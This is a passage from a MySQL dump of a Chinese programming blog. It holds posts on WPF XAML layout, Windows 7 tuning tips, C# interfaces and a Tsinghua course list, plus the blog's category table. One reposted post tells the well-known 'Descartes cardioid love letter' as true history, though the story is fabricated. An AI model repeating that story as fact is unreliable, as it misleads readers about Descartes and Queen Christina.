/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Image Source=&quot;data\\fish.png&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock Margin=&quot;5&quot; Foreground=&quot;Brown&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FontSize=&quot;12&quot;&gt;Fish&lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/DockPanel&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;DockPanel&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Image Source=&quot;data\\dog.png&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock Margin=&quot;5&quot; Foreground=&quot;Brown&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FontSize=&quot;12&quot;&gt;Dog&lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/DockPanel&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;DockPanel&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Image Source=&quot;data\\cat.png&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock Margin=&quot;5&quot; Foreground=&quot;Brown&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FontSize=&quot;12&quot;&gt;Cat&lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/DockPanel&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem.Items&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeView&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/StackPanel&gt;<br />\r\n&lt;/Window&gt;</p>\r\n',0,1438332097,0,0),(160,28,'Windows 7特色功能体验：优化篇','<p>任何系统都逃不过&ldquo;优化&rdquo;这个话题，XP如此，Vista更是因为开机进程太多以及相关冗余程序导致系统速度下降而饱受诟病。Win7吸取了Vista的教训，就很注重这一点，在Win7中我们发现开机自动运行的程序少了许多，很多设成手动的，因此Win7的开机速度就大大提高了。不仅仅在开机速度这一方面，Win7 还在许多方面的优化做足了功夫。</p>\r\n\r\n<p>1、加速磁盘碎片整理</p>\r\n\r\n<p>Windows 7中的磁盘碎片整理工具比Windows Vista提供了更多的可控选项，它的命令行版本也提供一些有趣的新功能。下面是参数说明：</p>\r\n\r\n<p>/r 并行处理多个驱动器</p>\r\n\r\n<p>/h 让磁盘碎片整理工具使用更多的系统资源，以便加速运行</p>\r\n\r\n<p>/u 提供定期进度报告，你可以看到整理碎片的详细过程</p>\r\n\r\n<p>命令用法示例：defrag /c /h /u /r</p>\r\n\r\n<p>作用：在一个命令行窗口中快速整理多个驱动器。</p>\r\n\r\n<p>2、让IE加载更快</p>\r\n\r\n<p>一些IE插件用去更多时间启动，无疑这会拖慢整个浏览器的性能。在Windows 7中的IE8里，使用者可以知道哪些浏览器插件(扩展)运行最慢。</p>\r\n\r\n<p>用法：点击Tools(工具) &gt;Manage Add-ons(管理加载项)，右侧的载入用时列表中显示了插件的运行情况。如果想让你的IE速度快些，你就知道该如何处置这些相关插件啦O(&cap;_&cap;)O</p>\r\n\r\n<p>3、修复任务栏</p>\r\n\r\n<p>Windows 7加强了安全性，因此，在关闭UAC的情况下，用于桌面侧边栏的gadgets将不能启用。如果你禁用了UAC，还打算正常使用gadgets，按照如下的方法操作。</p>\r\n\r\n<p>运行注册编辑器，找到以下位置：</p>\r\n\r\n<p>HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionSidebarSettings，创建一个新的DWORD值，键名为AllowElevatedProcess，数值设为1，这样gadgets又能正常启动了。</p>\r\n\r\n<p>4、Alt+Tab增强用法</p>\r\n\r\n<p>假设你已经打开了五个资源管理器，还运行着许多其它程序，此时要想在这么多程序中找到需要的，用传统的Alt+Tab来切换窗口确实是很费时的。</p>\r\n\r\n<p>怎么办呢?先按住Ctrl键，在资源管理器的图标上点一下，Windows 7将只在这几个资源管理器窗口间切换，这使得窗口定位的速度更快了。本技巧适用于任何支持同时开启多个实例的应用软件。</p>\r\n\r\n<p>5、禁用智能窗口排列</p>\r\n\r\n<p>Windows 7的另一个新功能就是智能排列窗口，当你把一个窗口拖拽到屏幕顶部时，它会自动最大化。这个功能可是让人又爱又恨，我们喜欢Windows 7，但不想用到它的部分功能，怎么办?还是求助于注册表吧，运行REGEDIT，跳转到：HKEY_CURRENT_USERControl PanelDesktop，设置WindowArrangementActive键值为0，重启。</p>\r\n\r\n<p>6、更好用的系统还原</p>\r\n\r\n<p>在Windows Vista中，有关于系统还原的设置选项很少。这一点在Windows 7中终于有了改进，有几个实用选项可供选择。点击开始按钮，右键点击我的电脑，选属性，系统保护，设置，在这里，你可以根据自身需要，设置系统还原的最大使用尺寸，尺寸越大还原点越多，越小则能释放更多磁盘空间。除此之外，还可以设置系统还原的默认保护范围。</p>\r\n\r\n<p>7、放大镜</p>\r\n\r\n<p>Windows 7中的放大镜有了改进，用起来更方便了。你可以定义一个比例和坐标，让放大镜跟踪键盘焦点。按下Tab键可以移动对话框，并能自动缩放。</p>\r\n\r\n<p>8、以不同身份运行程序</p>\r\n\r\n<p>按住Shift键，右键点击任何程序的快捷方式，可出现一个以不同用户身份运行程序的选项，比如使用家中孩子的受限帐户时，可以临时使用更高的权限。</p>\r\n\r\n<p>9、用命令行设置时区</p>\r\n\r\n<p>Windows7中新增了一个设置时区的命令：tzutil.exe。这意味着可以通过脚本为PC设置时区，IT管理员肯定会喜欢它。例如，要将某台PC设置为格林威治标准时间，用以下命令即可：</p>\r\n\r\n<p>tzutil /s gmt standard time，还有几个参数可选，比如，tzutil /g，显示当前时区，tzutil /l列出所有时区。</p>\r\n\r\n<p>10、调整电脑音量</p>\r\n\r\n<p>在Windows 7的默认状态下，当有语音电话(基于PC的)打出或打进来时，它会自动降低PC音箱的音量。如果不想用此功能，可随时设置关掉它。右键点击任务栏上的喇叭图标，选择Sounds &gt;Communications，根据自身需要进行设置即可。</p>\r\n\r\n<p>总体而言，Win7在优化方面真的是颇下了一番功夫。在此，我们需要感谢那些为Win7的问世付出辛劳的工程师们，让我们期待Win7 RC版本的面世吧，期待着有更新更好的东西出来。</p>\r\n',0,1438332241,0,0),(161,38,'C#接口-接口作为参数','<p>接口作为参数和返回值，都是同样的作用，所有继承了这个接口的类，都可以使用。也就是说，你给这个方法传参数的时候，可以把继承了这个接口的类的实例传给这个方法，同样的道理，你可以把继承了这个接口的类返回。</p>\r\n\r\n<p>接口做为参数传递，传递的是实现了接口的对象；<br />\r\n接口作为类型返回，返回的是实现了接口的对象。</p>\r\n\r\n<p>接口的传递与返回就是围绕着上面的两句话展开的。</p>\r\n\r\n<p>using System;</p>\r\n\r\n<p>// 一个人类的接口</p>\r\n\r\n<p>public interface IPerson<br />\r\n{<br />\r\nvoid Say();<br />\r\n}</p>\r\n\r\n<p>// 一个男人的类</p>\r\n\r\n<p>public class Man: IPerson<br />\r\n{<br />\r\npublic void Say()<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;我是一个男人&quot;);<br />\r\n}<br />\r\n}</p>\r\n\r\n<p>// 一个女人的类</p>\r\n\r\n<p>public class Woman: IPerson<br />\r\n{<br />\r\npublic void Say()<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;我是一个女人&quot;);<br />\r\n}<br />\r\n}</p>\r\n\r\n<p>// 一个人的类</p>\r\n\r\n<p>public class People<br />\r\n{<br />\r\npublic void Get(IPerson ipn) //接口做为参数传递<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; ipn.Say();<br />\r\n}<br />\r\n}</p>\r\n\r\n<p>class Program<br />\r\n{<br />\r\nstatic void Main(string[]args)<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; People p = new People();<br />\r\n&nbsp;&nbsp;&nbsp; Man m = new Man(); //这里，想实现谁接口里的方法，就实例化谁,然后在下边就传谁<br />\r\n&nbsp;&nbsp;&nbsp; Woman w = new Woman();<br />\r\n&nbsp;&nbsp;&nbsp; p.Get(m); //传递的是实现了接口的对象<br />\r\n&nbsp;&nbsp;&nbsp; p.Get(w);<br />\r\n&nbsp;&nbsp;&nbsp; Console.ReadLine();<br />\r\n}<br />\r\n}</p>\r\n',0,1438332408,0,0),(162,26,'清华大学计算机系网络课程','<p>清华大学计算机系网络课程</p>\r\n\r\n<p>C++语言程序设计</p>\r\n\r\n<p>JAVA编程语言</p>\r\n\r\n<p>MPI并行程序设计</p>\r\n\r\n<p>编译原理</p>\r\n\r\n<p>并行计算</p>\r\n\r\n<p>多媒体技术基础与应用</p>\r\n\r\n<p>工程数据库设计与应用</p>\r\n\r\n<p>汇编语言程序设计</p>\r\n\r\n<p>计算机图形学</p>\r\n\r\n<p>计算机网咯体系结构</p>\r\n\r\n<p>计算机系统结构</p>\r\n\r\n<p>计算机系统结构_研究生</p>\r\n\r\n<p>计算机原理</p>\r\n\r\n<p>计算机组成与结构</p>\r\n\r\n<p>宽带网络交换技术</p>\r\n\r\n<p>离散数学</p>\r\n\r\n<p>模式识别</p>\r\n\r\n<p>人工智能导论</p>\r\n\r\n<p>人工智能原理</p>\r\n\r\n<p>人工智能原理_研究生</p>\r\n\r\n<p>软件工程</p>\r\n\r\n<p>软件工程_研究生</p>\r\n\r\n<p>数据结构</p>\r\n\r\n<p>数据库系统概论</p>\r\n\r\n<p>数据库系统与应用</p>\r\n\r\n<p>数值分析</p>\r\n\r\n<p>数字系统设计自动化</p>\r\n\r\n<p>微型计算机技术</p>\r\n\r\n<p>信号处理原理</p>\r\n\r\n<p>虚拟现实与系统仿真</p>\r\n\r\n<p>组合数学</p>\r\n',0,1438332574,0,0),(163,26,'数学情书-r=a(1-sinθ)以及别人研究出的3D的','<p>反正就是看的比较好玩的转过来的，然后那个人还说些什么&ldquo;看到很多男生留言说画这个很简单，也有的说这不是函数，这是方程之类之类的。。。其实我想说，这都不是重点啦。。。这只是女生对恋爱情结的一种美好向往，你可以说是矫情~但就是那么简单~一生只为等待能手绘这个函数给我的人。。。只是想等待一个认认真真愿意把这份爱亲手转变为现实的人。。。而不是用软件画出来花花小姑娘的。。。&rdquo;</p>\r\n\r\n<p>总之？。。。</p>\r\n\r\n<p>先来讲讲数学情书。。。</p>\r\n\r\n<p>笛卡儿，１７世纪时出生于法国，他对于后人的贡献相当大，他是第一个发现直角坐标的人，可惜一生穷困潦倒。一直到在５２岁，一直默默无名。当时法国正流行黑死病，迪卡儿不得不逃离法国，于是他流浪到瑞典当乞丐。某天，他在市场乞讨时，有一群少女经过，其中一名少女发现他的口音不像是瑞典人，她对迪卡儿非常好奇，于是上前问他.......你从哪来的啊? 法国。你是做什么的啊? 我是数学家。这名少女叫克丽丝汀，１８岁，是一个公主，她和其它女孩子不一样，并不喜欢文学，而是热衷于数学。当她听到迪卡儿说名身份之后，感到相当大的兴趣，于是把迪卡儿邀请回宫。<br />\r\n迪卡儿就成了她的数学老师，将一生的研究倾囊相授给克丽丝汀。而克丽丝汀的数学也日益进步，直角坐标当时也只有迪卡儿这对师生才懂。后来，他们之间有了不一样的情愫，发生了喧腾一时的师生恋。这件事传到国王耳中，让国王相当愤怒！下令将迪卡儿处死，克丽丝汀以自缢相逼，国王害怕宝贝女儿真的会想不开，于是.......将迪卡儿放逐回法国，并将克丽丝汀软禁。迪卡儿一回到法国后，没多久就染上了黑死病，躺在床上奄奄一息。迪卡儿不断地写信到瑞典给克丽丝汀，但却被国王给拦截没收。所以克丽丝汀一直没收到迪卡儿的信.......在迪卡儿快要死去的时候，他寄出了第１３封信，当他寄出去没多久后...就气绝身亡了。这封信的内容只有短短的一行......r=a(1-sin&theta;)国王拦截到这封信之后，拆开看，发现并不是一如往常的情话。国王当然看不懂这项数学式，于是找来城里所有科学家来研究，但都没有人能够解开到底是什么意思。国王心想.......反正迪卡儿就快要快死了，</p>\r\n\r\n<p>而且公主被软禁时都闷闷不乐的，所以，就把信交给克丽丝汀。当克丽丝汀收到这封信时，雀跃无比，她很高与她的爱人还是在想念她的。她立刻动手研究这行字的秘密。没多久就解出来了，用的就是直角坐标图&theta;＝0&deg;时，r＝a(1－0)＝a &hellip;&hellip; A点当&theta;＝90&deg;时，r＝a(1－1)＝0 &hellip;&hellip; B点当&theta;＝180&deg;时，r＝a(1－0)＝a &hellip;&hellip; C点当&theta;＝270&deg;时，r＝a(1＋1)＝2a &hellip;&hellip; D点a为四截距的比值。而 B点是原点(0,0) ，这要靠点想象，把A,B,C,D四点用弧线连接起来连接出来..就是有名的心脏线。这就是迪卡儿和克丽丝汀之间秘密数学式不久之后那位国王也死了，克丽丝汀继承王位，登基之后马上派人在欧洲四处寻找迪卡儿的踪迹，可惜........人已故。传说，这第１３封的另类情书还保留在欧洲的迪卡儿纪念馆里。不过极坐标系的更完美</p>\r\n\r\n<p>这是原版的情书：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731174707413961.jpg\" style=\"height:457px; width:580px\" /></p>\r\n\r\n<p>接下来是有人研究出的3D的心：（x^2 + (9/4)y^2 + z^2 - 1)^3 - x^2z^3 - (9/80)y^2z^3 = 0</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731174740598614.jpg\" style=\"height:545px; width:580px\" /></p>\r\n\r\n<p>这是某位大侠用mathmatica画出来的</p>\r\n\r\n<p>然后说还有玫瑰的函数。。。x=(-pi:pi/100:pi);y=a*(1-sin(x));polar(y,&#39;r&#39;) 反正不知道是不是真的，自己虽然有用过Matlab却不会弄这些。。。呵呵&nbsp;&nbsp;&nbsp; 有兴趣的就是试试看吧</p>\r\n',0,1438336090,0,0);
/*!40000 ALTER TABLE `blog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `category`
--

DROP TABLE IF EXISTS `category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '' COMMENT '分类名称',
  `parent_id` int(11) NOT NULL DEFAULT '0' COMMENT '父分类id',
  `level` int(2) NOT NULL DEFAULT '1' COMMENT '几级分类,顶级分类为1',
  `blogs` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '分类下包含的博客数量',
  `creation_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `modification_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `is_deleted` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否被删除',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=47 DEFAULT CHARSET=utf8 COMMENT='博文分类';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `category`
--

LOCK TABLES `category` WRITE;
/*!40000 ALTER TABLE `category` DISABLE KEYS */;
INSERT INTO `category` VALUES (1,'js',0,1,13,0,0,0),(2,'jquery',1,2,2,0,0,0),(3,'css',0,1,3,0,0,0),(4,'css3',3,2,1,0,0,0),(5,'网站性能',0,1,1,0,0,0),(6,'静态化',5,2,1,0,0,0),(7,'版本控制',0,1,0,0,0,0),(8,'svn',7,2,3,0,0,0),(9,'缓存',5,2,1,0,0,0),(10,'php技术',0,1,17,0,0,0),(11,'程序架构',0,1,2,0,0,0),(12,'mvc',11,2,2,0,0,0),(13,'html',0,1,3,0,0,0),(14,'linux',0,1,0,0,0,0),(15,'软件安装',14,2,6,0,0,0),(16,'java',0,1,8,0,0,0),(17,'java面试题',16,2,1,0,0,0),(18,'常用操作',14,2,1,0,0,0),(19,'音频处理',0,1,0,0,0,0),(20,'视频处理',0,1,1,0,0,0),(21,'数据库使用',0,1,1,0,0,0),(22,'session优化',5,2,1,0,0,0),(23,'windows服务器',0,1,2,0,0,0),(24,'数据库优化',5,2,9,0,0,0),(25,'mysql优化',24,3,3,0,0,0),(26,'杂项',0,1,9,0,0,0),(27,'zend framework',10,2,1,0,0,0),(28,'windows客户机',0,1,4,0,0,0),(29,'css布局',3,2,1,0,0,0),(30,'cakephp',10,2,1,0,0,0),(31,'算法',0,1,1,0,0,0),(32,'mysql使用',21,2,6,0,0,0),(33,'jquery.validate',2,3,5,0,0,0),(34,'proguard',16,2,2,0,0,0),(35,'图片相似度算法',31,2,1,0,0,0),(36,'非主流linux',14,2,1,0,0,0),(37,'css兼容性',3,2,1,0,0,0),(38,'c#',0,1,31,0,0,0),(39,'sql server优化',24,3,1,0,0,0),(40,'svg',0,1,2,0,0,0),(41,'软件破解',0,1,1,0,0,0),(42,'网络安全',0,1,5,0,0,0),(43,'vml',13,2,3,0,0,0),(44,'sql server使用',21,2,2,0,0,0),(45,'html插件',13,2,2,0,0,0),(46,'apache',0,1,1,0,0,0);
/*!40000 ALTER TABLE `category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping routines for database 'blog'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2015-07-31 17:49:23
